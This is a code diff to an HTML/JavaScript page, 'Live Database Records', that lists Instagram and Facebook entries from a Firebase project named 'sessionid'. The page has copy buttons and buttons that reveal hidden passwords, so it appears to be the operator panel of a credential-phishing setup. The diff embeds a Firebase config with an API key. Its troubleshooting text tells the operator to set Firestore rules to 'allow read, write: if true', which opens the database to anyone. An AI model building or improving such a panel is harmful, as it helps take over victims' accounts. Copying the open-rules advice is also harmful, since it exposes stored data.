@@ -31,13 +31,21 @@
       align-items: center;
       padding-bottom: 16px;
       border-bottom: 1px solid #e5e7eb;
-      margin-bottom: 20px;
+      margin-bottom: 16px;
+      flex-wrap: wrap;
+      gap: 8px;
     }
 
     .title {
       font-size: 18px;
       font-weight: 600;
       color: #111827;
+    }
+
+    .status-wrap {
+      display: flex;
+      align-items: center;
+      gap: 8px;
     }
 
     .status {
@@ -47,12 +55,37 @@
 
     .status.connected {
       color: #059669;
-      font-weight: 500;
+      font-weight: 600;
     }
 
     .status.error {
       color: #dc2626;
-      font-weight: 500;
+      font-weight: 600;
+    }
+
+    /* Notice / Alert Box */
+    .alert-box {
+      background: #fef2f2;
+      border: 1px solid #fecaca;
+      color: #991b1b;
+      padding: 12px 16px;
+      border-radius: 6px;
+      font-size: 13px;
+      margin-bottom: 16px;
+      display: none;
+      line-height: 1.6;
+    }
+
+    .alert-box strong {
+      display: block;
+      margin-bottom: 4px;
+    }
+
+    .alert-box code {
+      background: rgba(0, 0, 0, 0.05);
+      padding: 2px 6px;
+      border-radius: 4px;
+      font-family: monospace;
     }
 
     /* Controls */
@@ -211,8 +244,14 @@
   <div class="container">
     <div class="top-bar">
       <div class="title">Live Database Records</div>
-      <div id="status" class="status">Connecting to Firebase...</div>
+      <div class="status-wrap">
+        <span id="status" class="status">Connecting to Firebase...</span>
+        <button id="btnRetry" class="btn-action" style="display:none;" onclick="startListening()">Retry</button>
+      </div>
     </div>
+
+    <!-- Alert Box for troubleshooting if needed -->
+    <div id="alertBox" class="alert-box"></div>
 
     <div class="controls">
       <div class="tabs">
@@ -230,76 +269,171 @@
     </div>
 
     <div id="contentArea">
-      <div class="empty-state">Loading data...</div>
+      <div class="empty-state">Connecting to Firebase Firestore...</div>
     </div>
   </div>
 
   <div id="toast" class="toast">Copied</div>
 
-  <!-- Firebase Scripts -->
-  <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore-compat.js"></script>
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+    import { 
+      initializeFirestore, 
+      collection, 
+      onSnapshot, 
+      getDocs 
+    } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
 
-  <script>
+    // Global error listener to catch any network or script errors
+    window.addEventListener('error', (e) => {
+      showError('Script error: ' + (e.message || e.error));
+    });
+    window.addEventListener('unhandledrejection', (e) => {
+      showError('Promise error: ' + (e.reason?.message || e.reason));
+    });
+
     const firebaseConfig = {
-      apiKey: "AIzaSyDvIbPNBaUGc5LK0wujhIFSG_WTcT7ElLc",
-      authDomain: "sessionid-74814.firebaseapp.com",
-      projectId: "sessionid-74814",
-      storageBucket: "sessionid-74814.appspot.com",
-      messagingSenderId: "299780937054",
-      appId: "1:299780937054:web:d59aeaedccd1439c6febcf",
-      measurementId: "G-JSQEE28YSP"
+      apiKey: "AIzaSyAIozb7XfqF1nLfrd9Q-pVhNwpgCWruwn0",
+      authDomain: "sessionid-49465.firebaseapp.com",
+      projectId: "sessionid-49465",
+      storageBucket: "sessionid-49465.firebasestorage.app",
+      messagingSenderId: "782636329164",
+      appId: "1:782636329164:web:eb4f7c893cb6f8a3183a69",
+      measurementId: "G-87FXSPPRR3"
     };
 
-    firebase.initializeApp(firebaseConfig);
-    const db = firebase.firestore();
+    let app;
+    let db;
+    try {
+      app = initializeApp(firebaseConfig);
+      // experimentalAutoDetectLongPolling prevents WebChannel streaming hanging on localhost
+      db = initializeFirestore(app, {
+        experimentalAutoDetectLongPolling: true,
+      });
+    } catch (err) {
+      showError("Firebase Init Error: " + err.message);
+    }
 
     let currentTab = 'instagram';
     let instagramList = [];
     let facebookList = [];
     let filterQuery = '';
+    let isConnected = false;
 
     const statusEl = document.getElementById('status');
+    const alertBox = document.getElementById('alertBox');
+    const btnRetry = document.getElementById('btnRetry');
 
-    // Instagram Listener
-    db.collection('instagram').onSnapshot((snapshot) => {
-      statusEl.textContent = 'Connected';
-      statusEl.className = 'status connected';
+    function showError(msg) {
+      console.error(msg);
+      statusEl.textContent = 'Connection Error';
+      statusEl.className = 'status error';
+      btnRetry.style.display = 'inline-block';
+      alertBox.style.display = 'block';
 
-      instagramList = [];
-      snapshot.forEach(doc => {
-        instagramList.push({ id: doc.id, ...doc.data() });
+      if (msg.includes('permission-denied') || msg.includes('PERMISSION_DENIED') || msg.includes('Missing or insufficient permissions')) {
+        alertBox.innerHTML = `
+          <strong>Firebase Permission Denied!</strong>
+          Firebase Firestore Security Rules allow nahi kar rahe hain.<br>
+          Fix karne ke liye: 
+          1. <a href="https://console.firebase.google.com/project/sessionid-49465/firestore/rules" target="_blank" style="color:#b91c1c; font-weight:bold;">Firebase Console > Firestore Rules</a> par jayein.<br>
+          2. Rules me <code>allow read, write: if true;</code> set karke <strong>Publish</strong> kar dein.
+        `;
+      } else {
+        alertBox.innerHTML = `<strong>Error:</strong> ${msg}`;
+      }
+    }
+
+    // Timeout check: agar 6 second me connect na ho to clear diagnosis show karo
+    setTimeout(() => {
+      if (!isConnected) {
+        statusEl.textContent = 'Connection Delayed';
+        statusEl.className = 'status error';
+        btnRetry.style.display = 'inline-block';
+        alertBox.style.display = 'block';
+        alertBox.innerHTML = `
+          <strong>Firebase se connect hone me samay lag raha hai:</strong><br>
+          1. Browser console (F12 > Console) me check karein koi error to nahi hai.<br>
+          2. Agar Firebase Console me Security Rules locked hain, to <a href="https://console.firebase.google.com/project/sessionid-49465/firestore/rules" target="_blank" style="color:#b91c1c; font-weight:bold;">Firestore Rules</a> me <code>allow read, write: if true;</code> kar dein.<br>
+          3. Connection check karne ke liye Retry button dabayein.
+        `;
+      }
+    }, 6000);
+
+    window.startListening = function() {
+      btnRetry.style.display = 'none';
+      alertBox.style.display = 'none';
+      statusEl.textContent = 'Connecting to Firebase...';
+      statusEl.className = 'status';
+
+      const igCol = collection(db, 'instagram');
+      const fbCol = collection(db, 'facebook');
+
+      // 1. Direct fetch first for instant loading
+      getDocs(igCol).then(snap => {
+        isConnected = true;
+        statusEl.textContent = 'Connected (Live)';
+        statusEl.className = 'status connected';
+        alertBox.style.display = 'none';
+
+        instagramList = [];
+        snap.forEach(doc => instagramList.push({ id: doc.id, ...doc.data() }));
+        instagramList.sort((a, b) => getTime(b.timestamp) - getTime(a.timestamp));
+        document.getElementById('countIg').textContent = instagramList.length;
+        if (currentTab === 'instagram') render();
+      }).catch(err => {
+        showError(err.message);
       });
 
-      instagramList.sort((a, b) => getTime(b.timestamp) - getTime(a.timestamp));
-      document.getElementById('countIg').textContent = instagramList.length;
+      getDocs(fbCol).then(snap => {
+        isConnected = true;
+        statusEl.textContent = 'Connected (Live)';
+        statusEl.className = 'status connected';
+        alertBox.style.display = 'none';
 
-      if (currentTab === 'instagram') render();
-    }, (err) => {
-      console.error(err);
-      statusEl.textContent = 'Error: ' + err.message;
-      statusEl.className = 'status error';
-    });
-
-    // Facebook Listener
-    db.collection('facebook').onSnapshot((snapshot) => {
-      statusEl.textContent = 'Connected';
-      statusEl.className = 'status connected';
-
-      facebookList = [];
-      snapshot.forEach(doc => {
-        facebookList.push({ id: doc.id, ...doc.data() });
+        facebookList = [];
+        snap.forEach(doc => facebookList.push({ id: doc.id, ...doc.data() }));
+        facebookList.sort((a, b) => getTime(b.timestamp) - getTime(a.timestamp));
+        document.getElementById('countFb').textContent = facebookList.length;
+        if (currentTab === 'facebook') render();
+      }).catch(err => {
+        showError(err.message);
       });
 
-      facebookList.sort((a, b) => getTime(b.timestamp) - getTime(a.timestamp));
-      document.getElementById('countFb').textContent = facebookList.length;
+      // 2. Attach Real-time listener for live updates
+      onSnapshot(igCol, (snap) => {
+        isConnected = true;
+        statusEl.textContent = 'Connected (Live)';
+        statusEl.className = 'status connected';
+        alertBox.style.display = 'none';
 
-      if (currentTab === 'facebook') render();
-    }, (err) => {
-      console.error(err);
-      statusEl.textContent = 'Error: ' + err.message;
-      statusEl.className = 'status error';
-    });
+        instagramList = [];
+        snap.forEach(doc => instagramList.push({ id: doc.id, ...doc.data() }));
+        instagramList.sort((a, b) => getTime(b.timestamp) - getTime(a.timestamp));
+        document.getElementById('countIg').textContent = instagramList.length;
+        if (currentTab === 'instagram') render();
+      }, (err) => {
+        showError(err.message);
+      });
+
+      onSnapshot(fbCol, (snap) => {
+        isConnected = true;
+        statusEl.textContent = 'Connected (Live)';
+        statusEl.className = 'status connected';
+        alertBox.style.display = 'none';
+
+        facebookList = [];
+        snap.forEach(doc => facebookList.push({ id: doc.id, ...doc.data() }));
+        facebookList.sort((a, b) => getTime(b.timestamp) - getTime(a.timestamp));
+        document.getElementById('countFb').textContent = facebookList.length;
+        if (currentTab === 'facebook') render();
+      }, (err) => {
+        showError(err.message);
+      });
+    };
+
+    // Auto start
+    window.startListening();
 
     function getTime(ts) {
       if (!ts) return 0;
@@ -316,27 +450,27 @@
       return d.toLocaleString();
     }
 
-    function switchTab(tab) {
+    window.switchTab = function(tab) {
       currentTab = tab;
       document.getElementById('tabIg').className = tab === 'instagram' ? 'tab-btn active' : 'tab-btn';
       document.getElementById('tabFb').className = tab === 'facebook' ? 'tab-btn active' : 'tab-btn';
       render();
-    }
+    };
 
-    function handleSearch() {
+    window.handleSearch = function() {
       filterQuery = document.getElementById('search').value.toLowerCase().trim();
       render();
-    }
+    };
 
-    function copyVal(val) {
+    window.copyVal = function(val) {
       navigator.clipboard.writeText(val).then(() => {
         const toast = document.getElementById('toast');
         toast.classList.add('show');
         setTimeout(() => toast.classList.remove('show'), 1500);
       });
-    }
+    };
 
-    function togglePwd(id, rawVal) {
+    window.togglePwd = function(id, rawVal) {
       const el = document.getElementById(id);
       const btn = document.getElementById('btn-' + id);
       if (el.dataset.hidden === 'true') {
@@ -348,7 +482,7 @@
         el.dataset.hidden = 'true';
         btn.textContent = 'Show';
       }
-    }
+    };
 
     function render() {
       const container = document.getElementById('contentArea');
